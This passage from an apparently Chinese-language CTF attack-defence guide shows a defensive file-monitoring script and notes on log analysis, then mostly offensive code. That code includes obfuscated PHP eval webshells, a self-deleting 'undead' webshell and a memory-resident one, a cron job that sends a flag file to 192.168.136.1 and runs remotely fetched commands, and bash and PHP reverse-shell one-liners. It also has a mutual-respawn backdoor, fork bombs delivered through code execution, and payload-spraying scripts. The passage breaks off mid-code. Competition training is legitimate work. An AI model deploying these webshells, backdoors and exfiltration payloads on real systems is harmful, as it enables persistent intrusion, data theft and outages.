u&apos;---------start------------&apos;</span><br><span class="line">    for value in Special_path:</span><br><span class="line">        mkdir_p(Special_path[value])</span><br><span class="line">    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span><br><span class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG</span><br><span class="line">    print u&apos;[*] pre work end!&apos;</span><br><span class="line">    while True:</span><br><span class="line">        file_list = getfilelist(CWD)</span><br><span class="line">        # 移除新上传文件</span><br><span class="line">        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))</span><br><span class="line">        if len(diff_file_list) != 0:</span><br><span class="line">            # import pdb;pdb.set_trace()</span><br><span class="line">            for filepath in diff_file_list:</span><br><span class="line">                try:</span><br><span class="line">                    f = open(filepath, &apos;r&apos;).read()</span><br><span class="line">                except Exception, e:</span><br><span class="line">                    break</span><br><span class="line">                if Special_string not in f:</span><br><span class="line">                    try:</span><br><span class="line">                        print u&apos;[*] webshell find : &apos; + getUnicode(filepath)</span><br><span class="line">                        shutil.move(filepath, os.path.join(Special_path[&apos;webshell&apos;], ntpath.basename(filepath) + &apos;.txt&apos;))</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&apos;[!] move webshell error, &quot;%s&quot; maybe is webshell.&apos;%getUnicode(filepath)</span><br><span class="line">                    try:</span><br><span class="line">                        f = open(os.path.join(Special_path[&apos;log&apos;], &apos;log.txt&apos;), &apos;a&apos;)</span><br><span class="line">                        f.write(&apos;newfile: &apos; + getUnicode(filepath) + &apos; : &apos; + str(time.ctime()) + &apos;\n&apos;)</span><br><span class="line">                        f.close()</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&apos;[-] log error : file move error: &apos; + getUnicode(e)</span><br><span class="line"></span><br><span class="line">        # 防止任意文件被修改,还原被修改文件</span><br><span class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">        for filekey in md5_dict:</span><br><span class="line">            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">                try:</span><br><span class="line">                    f = open(filekey, &apos;r&apos;).read()</span><br><span class="line">                except Exception, e:</span><br><span class="line">                    break</span><br><span class="line">                if Special_string not in f:</span><br><span class="line">                    try:</span><br><span class="line">                        print u&apos;[*] file had be change : &apos; + getUnicode(filekey)</span><br><span class="line">                        shutil.move(filekey, os.path.join(Special_path[&apos;difffile&apos;], ntpath.basename(filekey) + &apos;.txt&apos;))</span><br><span class="line">                        shutil.move(os.path.join(Special_path[&apos;bak&apos;], ntpath.basename(filekey)), filekey)</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&apos;[!] move webshell error, &quot;%s&quot; maybe is webshell.&apos;%getUnicode(filekey)</span><br><span class="line">                    try:</span><br><span class="line">                        f = open(os.path.join(Special_path[&apos;log&apos;], &apos;log.txt&apos;), &apos;a&apos;)</span><br><span class="line">                        f.write(&apos;diff_file: &apos; + getUnicode(filekey) + &apos; : &apos; + getUnicode(time.ctime()) + &apos;\n&apos;)</span><br><span class="line">                        f.close()</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&apos;[-] log error : done_diff: &apos; + getUnicode(filekey)</span><br><span class="line">                        pass</span><br><span class="line">        time.sleep(2)</span><br><span class="line">        # print &apos;[*] &apos; + getUnicode(time.ctime())</span><br></pre></td></tr></table></figure><p>弱口令排查即是主办方给的服务器为弱口令，或者自己服务器内部Web服务内存在弱口令，针对这种情况一定要及时更改弱口令，做好弱口令检查。</p><p>nmap 扫描 22<br><code>hydra  -user   -p</code><br>字典生成工具: <a href="https://blog.csdn.net/qq_33936481/article/details/51277679" target="_blank" rel="noopener">参考网站</a></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析:"></a>日志分析:</h2><p>在线下攻防模式中日志分析是非常重要的一环，日志分析一般是在比赛正式开始之后进行的对其他攻击者的流量进行分析提取有用的信息，通过查看其他队伍打过来的流量可以分析到他们留下的WebShell文件名、漏洞利用方式、漏洞产生的点，方便自己进行攻击。因为主办方可能会不允许选手查看日志文件，再加上日志文件不会对POST的数据进行分析打印，所以我们在进行日志监控、流量分析时，一定要提前准备好自己的监控脚本，对Web服务进行监控、分析，这样才可以抓取到完整的其他队伍打过来的流量，方便自己审查。</p><h3 id="日志分析的用途"><a href="#日志分析的用途" class="headerlink" title="日志分析的用途"></a>日志分析的用途</h3><p>感知可能正在发生的攻击，从而规避存在的安全风险<br>应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失<br>记录log脚本<br>这种脚本网上有很多。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">date_default_timezone_set(<span class="string">'Asia/Shanghai'</span>);</span><br><span class="line">$ip       = $_SERVER[<span class="string">"REMOTE_ADDR"</span>]; <span class="comment">//记录访问者的ip</span></span><br><span class="line">$filename = $_SERVER[<span class="string">'PHP_SELF'</span>];<span class="comment">//访问者要访问的文件名</span></span><br><span class="line">$parameter   = $_SERVER[<span class="string">"QUERY_STRING"</span>]; <span class="comment">//访问者要请求的参数</span></span><br><span class="line">$time     =   date(<span class="string">'Y-m-d H:i:s'</span>,time()); <span class="comment">//访问时间</span></span><br><span class="line">$logadd = <span class="string">'来访时间：'</span>.$time.<span class="string">'--&gt;'</span>.<span class="string">'访问链接：'</span>.<span class="string">'http://'</span>.$ip.$filename.<span class="string">'?'</span>.$parameter.<span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// log记录</span></span><br><span class="line">$fh = fopen(<span class="string">"log.txt"</span>, <span class="string">"a"</span>);</span><br><span class="line">fwrite($fh, $logadd);</span><br><span class="line">fclose($fh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="日志分析工具"><a href="#日志分析工具" class="headerlink" title="日志分析工具:"></a>日志分析工具:</h3><pre><code>LogForensics 腾讯实验室https://security.tencent.com/index.php/opensource/detail/15北风飘然@金乌网络安全实验室http://www.freebuf.com/sectool/126698.html网络ID为piaox的安全从业人员：http://www.freebuf.com/sectool/110644.html网络ID：SecSkyhttp://www.freebuf.com/sectool/8982.html网络ID：鬼魅羊羔http://www.freebuf.com/articles/web/96675.html</code></pre><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>在CTF攻防赛中，比赛的语言以PHP居多，漏洞的类型主要为后门漏洞、注入类型、文件上传、文件包含、代码执行、命令执行或互联网已公开的已知CMS漏洞。因此在比赛中，漏洞挖掘主要是以这几种漏洞为主。</p><p>漏洞挖掘阶段，首先将备份的源代码使用D盾进行查杀，筛选出D盾扫描出的木马文件然后在服务器上将其删除。对于其他类型的漏洞，主要还是通过白盒与黑盒方式进行漏洞挖掘。黑盒的方式与渗透测试有点相似，而白盒测试中，笔者使用的工具为“Seay源代码审计系统”，根据工具列出的漏洞描述去尽可能找上述的漏洞类型</p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><ol><li>生成“.”开头的隐藏文件。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'.config.php'</span>, <span class="string">'&lt;?php phpinfo();?&gt;'</span>);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>生成“-”开头的文件。</li></ol><p>-开头的文件，如果使用rm直接删除，将无法删除，因为rm命令将会把-后面的字符串当作参数去执行。</p><pre><code>root@JD:~/test# echo &quot;123&quot; &gt; -test.phproot@JD:~/test# rm -test.php rm: invalid option -- &apos;t&apos;Try &apos;rm ./-test.php&apos; to remove the file &apos;-test.php&apos;.Try &apos;rm --help&apos; for more information.root@JD:~/test#</code></pre><ol start="3"><li>使用不死马。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents(<span class="string">'.config.php'</span>, <span class="string">'&lt;?php phpinfo();?&gt;'</span>);</span><br><span class="line">    system(<span class="string">'chmod 777 .config.php'</span>); </span><br><span class="line">    touch(<span class="string">".config.php"</span>, mktime(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">17</span>,<span class="number">2017</span>)); </span><br><span class="line">usleep(<span class="number">100</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上述代码的意思为：首先代码设置程序永久执行直到程序结束，并且客户端关闭后仍然可以执行PHP代码，可保持PHP进程一直在执行。然后删除自己后进入循环，循环生成木马文件。由于源木马已自删除，且已注入内存中执行，想让程序停止，只能是重启服务，或者找出此程序的进程然后kill。</p><p>也可使用不死马生成“-”开头的木马文件</p><h2 id="自动化攻击"><a href="#自动化攻击" class="headerlink" title="自动化攻击"></a>自动化攻击</h2><p>自动化攻击在CTF线下攻防赛的体现是自动化打payload获取到Flag然后自动提交的过程</p><p>批量攻击<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] Starting attack framework..."</span></span><br><span class="line">    round_time = <span class="number">60</span> * <span class="number">5</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] Round time : %s seconds..."</span> % (round_time)</span><br><span class="line">    wait_time = round_time / <span class="number">2</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] Wait time : %s seconds..."</span> % (wait_time)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   exploit_all()</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"[+] This round is finished , waiting for the next round..."</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(wait_time):</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"[+] The next attack is %d seconds later..."</span> % (wait_time - i)</span><br><span class="line">   time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    flag = get_flag(host, port)</span><br><span class="line">    submit_flag(flag, token)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit_all</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"targets"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    host = line.split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    port = int(line.split(<span class="string">":"</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] Exploiting : %s:%d"</span> % (host, port)</span><br><span class="line">    exploit(host, port)</span><br></pre></td></tr></table></figure></p><h3 id="RCE-之后"><a href="#RCE-之后" class="headerlink" title="RCE 之后"></a>RCE 之后</h3><h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>webshell最好有一定的伪装性，文件名可以以 . 开头。<br>对于不同肉鸡上的webshell设置不同密码，防止别人用你的马来收flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @preg_replace(&quot;/[email]/e&quot;,$_POST[&apos;h&apos;],&quot;error&quot;); ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$uf=&quot;snc3&quot;;</span><br><span class="line">$ka=&quot;IEBldmFbsK&quot;;</span><br><span class="line">$pjt=&quot;CRfUE9TVF&quot;;</span><br><span class="line">$vbl = str_replace(&quot;ti&quot;,&quot;&quot;,&quot;tistittirti_rtietipltiatice&quot;);</span><br><span class="line">$iqw=&quot;F6ciddKTs=&quot;;</span><br><span class="line">$bkf = $vbl(&quot;k&quot;, &quot;&quot;, &quot;kbakske6k4k_kdkekckokdke&quot;);</span><br><span class="line">$sbp = $vbl(&quot;ctw&quot;,&quot;&quot;,&quot;ctwcctwrectwatctwectw_fctwuncctwtctwioctwn&quot;);</span><br><span class="line">$mpy = $sbp(&apos;&apos;, $bkf($vbl(&quot;b&quot;, &quot;&quot;, $ka.$pjt.$uf.$iqw))); $mpy();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$_uU=chr(99).chr(104).chr(114);</span><br><span class="line">echo $_uU;</span><br><span class="line">$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).</span><br><span class="line"></span><br><span class="line">$_uU(110);</span><br><span class="line">echo $_cC;</span><br><span class="line">$_=$_fF(&quot;&quot;,$_cC);@$_();</span><br><span class="line">?&gt;</span><br><span class="line">//eval($_POST[1])</span><br></pre></td></tr></table></figure><h4 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">def write_memery_webshell(url, directory, password):</span><br><span class="line">    sleep_time = 500 # micro second</span><br><span class="line">    code = &quot;&lt;?php $content = &apos;&lt;?php eval(base64_decode($_REQUEST[%s]));?&gt;&apos;; $writable_path = &apos;%s&apos;; $filename = &apos;.%s.php&apos;; $path = $writable_path.&apos;/&apos;.$filename; ignore_user_abort(true); set_time_limit(0);      while(true)&#123; if(file_get_contents($path) != $content)&#123; file_put_contents($path, $content); &#125; usleep(%d); &#125;?&gt;&quot; % (password, directory, password, sleep_time)</span><br><span class="line">filename = &quot;.%s.php&quot; % (password)</span><br><span class="line">    path = &quot;%s/%s&quot; % (directory, filename)</span><br><span class="line">    payload = &quot;file_put_contents(&apos;%s&apos;, base64_decode(&apos;%s&apos;));&quot; % (path, code.encode(&quot;base64&quot;).replace(&quot;\n&quot;, &quot;&quot;))</span><br><span class="line">    print payload</span><br><span class="line">    return code_exec(url, payload).split(&quot;\n&quot;)[0:-1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_memery_webshell(url, directory, password):</span><br><span class="line">    sleep_time = 500 # micro second</span><br><span class="line">    code = &quot;&lt;?php $content = &apos;&lt;?php eval($_REQUEST[%s]);?&gt;&apos;; $writable_path = &apos;%s&apos;; $filename = &apos;.%s.php&apos;; $path = $writable_path.&apos;/&apos;.$filename; ignore_user_abort(true); set_time_limit(0); while(true)&#123;      if(file_get_contents($path) != $content)&#123; file_put_contents($path, $content); &#125; usleep(%d); &#125;?&gt;&quot; % (password, directory, password, sleep_time)</span><br><span class="line">filename = &quot;.%s.php&quot; % (password)</span><br><span class="line">    path = &quot;%s/%s&quot; % (directory, filename)</span><br><span class="line">    payload = &quot;file_put_contents(&apos;%s&apos;, base64_decode(&apos;%s&apos;));&quot; % (path, code.encode(&quot;base64&quot;).replace(&quot;\n&quot;, &quot;&quot;))</span><br><span class="line">    return shell_exec(url, payload).split(&quot;\n&quot;)[0:-1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def active_memery_webshell(url):</span><br><span class="line">    try:</span><br><span class="line">        requests.get(url, timeout=0.5)</span><br><span class="line">    except:</span><br><span class="line">        print &quot;[+] OK!&quot;</span><br></pre></td></tr></table></figure><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$message=&quot;* * * * * curl 192.168.136.1:8098/?flag=$(cat /var/www/html/flag)&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&quot;;</span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">while (true) &#123;</span><br><span class="line">$x =file_get_contents(&apos;/var/www/html/flag&apos;);</span><br><span class="line">file_get_contents(&apos;http://192.168.136.1:8099/test.php?token=kericwy&amp;flag=&apos;.$x);</span><br><span class="line">sleep(5);</span><br><span class="line">system(&quot;echo &apos;$message&apos; &gt; /tmp/1 ;&quot;);</span><br><span class="line">system(&quot;crontab /tmp/1;&quot;);</span><br><span class="line">system(&quot;rm /tmp/1;&quot;);</span><br><span class="line">$c=file_get_contents(&apos;http://192.168.136.1:8100/1.txt&apos;);</span><br><span class="line">system($c);</span><br></pre></td></tr></table></figure><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>在bash下可以运行：</p><pre><code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1php -r &apos;$sock=fsockopen(&quot;127.0.0.1&quot;,&quot;4444&quot;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;         python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</code></pre><h3 id="进程守护"><a href="#进程守护" class="headerlink" title="进程守护"></a>进程守护</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">while [[ : ]]; do</span><br><span class="line"># tell php that i am living</span><br><span class="line">echo &quot;Creating lock file...&quot;</span><br><span class="line">touch -a $&#123;bash_lock_file&#125;</span><br><span class="line"># check php is living or not</span><br><span class="line">last_access_time=`stat -c %X $&#123;php_lock_file&#125;`</span><br><span class="line">now_time=`date +%s`</span><br><span class="line">echo &quot;php last alive time : $&#123;last_access_time&#125;&quot;</span><br><span class="line">echo $[ $now_time - $last_access_time ];</span><br><span class="line">if [ ! -f &quot;$&#123;php_lock_file&#125;&quot; ] || [ $[ $now_time - $last_access_time ] -gt $((sleep_time+1)) ]; then</span><br><span class="line">echo &quot;[-] php script is dead!&quot;</span><br><span class="line">echo &quot;downloading php script&quot;</span><br><span class="line">wget $&#123;php_url&#125; -O $target_path &amp;&amp; curl $&#123;start_url&#125; -m $&#123;time_out&#125;</span><br><span class="line">else</span><br><span class="line">echo &quot;PHP script is alive...&quot;</span><br><span class="line">fi</span><br><span class="line"># sleeping</span><br><span class="line">echo &quot;sleeping...&quot;</span><br><span class="line">sleep $&#123;sleep_time&#125;</span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$sleep_time = 3; // max sleep_time : 3 seconds</span><br><span class="line">$content = file_get_contents($bash_url);</span><br><span class="line">while(true)&#123;</span><br><span class="line">// tell bash that i am living</span><br><span class="line">echo &quot;Telling bash that i am alive...\n&quot;;</span><br><span class="line">touch($php_lock_file);</span><br><span class="line">echo &quot;PHP Lock file last accessed : &quot;.(time() - fileatime($php_lock_file)).&quot;\n&quot;;</span><br><span class="line">// check bash is living or not</span><br><span class="line">echo &quot;Checking the bash script is alive or not...\n&quot;;</span><br><span class="line">if(!(file_exists($bash_lock_file) &amp;&amp; ((time() - fileatime($bash_lock_file)) &lt; ($sleep_time + 1))))&#123;</span><br><span class="line">echo &quot;The bash script is dead!\n&quot;;</span><br><span class="line">// download bash script</span><br><span class="line">echo &quot;Downloading bash script...\n&quot;;</span><br><span class="line">@file_put_contents($bash_path, $content);</span><br><span class="line">// restart bash script</span><br><span class="line">echo &quot;Restarting bash script...\n&quot;;</span><br><span class="line">@popen(&apos;nohup bash &apos;.$bash_path.&apos; &amp;&apos;, &apos;r&apos;);</span><br><span class="line">&#125;</span><br><span class="line">// control loop speed</span><br><span class="line">echo &quot;Sleeping...\n&quot;;</span><br><span class="line">sleep($sleep_time);</span><br><span class="line">// backdoor</span><br><span class="line">echo &quot;Executing backdoor...&quot;;</span><br><span class="line">@eval(file_get_contents($code_url));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fork炸弹"><a href="#fork炸弹" class="headerlink" title="fork炸弹"></a>fork炸弹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def main():</span><br><span class="line">    host = &quot;192.168.50.57&quot;</span><br><span class="line">    port = &quot;80&quot;</span><br><span class="line">    url = &quot;http://%s:%s/code.php&quot; % (host, port)</span><br><span class="line">    code = &quot;system(\&quot;echo &apos;.() &#123; .|.&amp; &#125; &amp;&amp; .&apos; &gt; /tmp/aaa\&quot;);system(\&quot;/bin/bash /tmp/aaa\&quot;);echo \&quot;seems good!\&quot;;&quot;</span><br><span class="line">    print code_exec(url, code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    host = &quot;127.0.0.1&quot;</span><br><span class="line">    port = &quot;80&quot;</span><br><span class="line">    url = &quot;http://%s:%s/c.php&quot; % (host, port)</span><br><span class="line">    command = &quot;:()&#123; :|: &amp; &#125;;:&quot;</span><br><span class="line">    shell_exec(url, command)</span><br></pre></td></tr></table></figure><h3 id="垃圾流量生成"><a href="#垃圾流量生成" class="headerlink" title="垃圾流量生成"></a>垃圾流量生成</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">def get_all(root, arg):</span><br><span class="line">    all = []</span><br><span class="line">    result = os.walk(root)</span><br><span class="line">    for path,d,filelist in result:</span><br><span class="line">        for file in filelist:</span><br><span class="line">            if file.endswith(&quot;.php&quot;):</span><br><span class="line">               full_path = path + &quot;/&quot; + file</span><br><span class="line">               content = get_content(full_path)</span><br><span class="line">               all.append((&quot;/&quot; + file, find_arg(content, arg)))</span><br><span class="line">    return all</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    root = &quot;.&quot;</span><br><span class="line">    print get_all(root, &quot;_GET&quot;)</span><br><span class="line">    print get_all(root, &quot;_POST&quot;)</span><br><span class="line">    print get_all(root, &quot;_COOKIE&quot;)</span><br><span class="line">def get_fake_plain_payloads(flag_path):</span><br><span class="line">    payloads = []</span><br><span class="line">    payloads.append(&apos;system(&quot;cat %s&quot;);&apos; % (flag_path))</span><br><span class="line">    payloads.append(&apos;highlight_file(&quot;%s&quot;);&apos; % (flag_path))</span><br><span class="line">    payloads.append(&apos;echo file_get_contents(&quot;%s&quot;);&apos; % (flag_path))</span><br><span class="line">    payloads.append(&apos;var_dump(file_get_contents(&quot;%s&quot;));&apos; % (flag_path))</span><br><span class="line">    payloads.append(&apos;print_r(file_get_contents(&quot;%s&quot;));&apos; % (flag_path))</span><br><span class="line">    return payloads</span><br><span class="line"></span><br><span class="line">def get_fake_base64_payloads(flag_path):</span><br><span class="line">    payloads = get_fake_plain_payloads(flag_path)</span><br><span class="line">    return [payload.encode(&quot;base64&quot;).replace(&quot;\n&quot;,&quot;&quot;) for payload in payloads]</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    flag_path = &quot;/home/web/flag/flag&quot;</span><br><span class="line">    print get_fake_plain_payloads(flag_path)</span><br><span class="line">    print get_fake_base64_payloads(flag_path)</span><br><span class="line"></span><br><span class="line">def handle_get(url, root, flag_path):</span><br><span class="line">    all_requests = []</span><br><span class="line">    http_get = get_all(root, &quot;_GET&quot;)</span><br><span class="line">    plain_payloads = get_fake_plain_payloads(flag_path)</span><br><span class="line">    base64_payloads = get_fake_base64_payloads(flag_path)</span><br><span class="line">    for item in http_get:</span><br><span class="line">        path = item[0]</span><br><span class="line">          args = item[1]</span><br><span class="line">                 for arg in args:</span><br><span class="line">                    for payload in plain_payloads:</span><br><span class="line">                              new_url = &quot;%s%s?%s=%s&quot; % (url, path[len(&quot;./&quot;):], arg[len(&quot;$_GET[&apos;&quot;):-len(&quot;&apos;]&quot;)], payload)</span><br><span class="line">                              request = requests.Request(&quot;GET&quot;, new_url)</span><br><span class="line">                        all_requests.append(request)</span><br><span class="line">                          for payload in base64_payloads:</span><br><span class="line">                              new_url = &quot;%s%s?%s=%s&quot; % (url, path[len(&quot;./&quot;):], arg[len(&quot;$_GET[&apos;&quot;):-len(&quot;&apos;]&quot;)], 